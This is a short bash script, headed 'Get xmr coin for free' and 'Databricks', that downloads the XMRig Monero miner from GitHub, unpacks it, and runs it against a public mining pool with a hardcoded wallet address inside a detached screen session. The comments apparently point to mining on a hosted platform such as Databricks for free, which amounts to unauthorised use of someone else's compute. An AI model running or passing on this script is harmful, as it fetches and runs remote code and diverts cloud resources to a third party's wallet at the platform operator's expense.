#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 82tDjMra5A42GczMEDKZDzVAMxTjY2YzLaAQvdnk9MFMi5S51GBaTtKiC6sNsjxs3NPiYGSAH77k84SBrZAVbX7sHDZiFP4 -k --tls --rig-id Book1
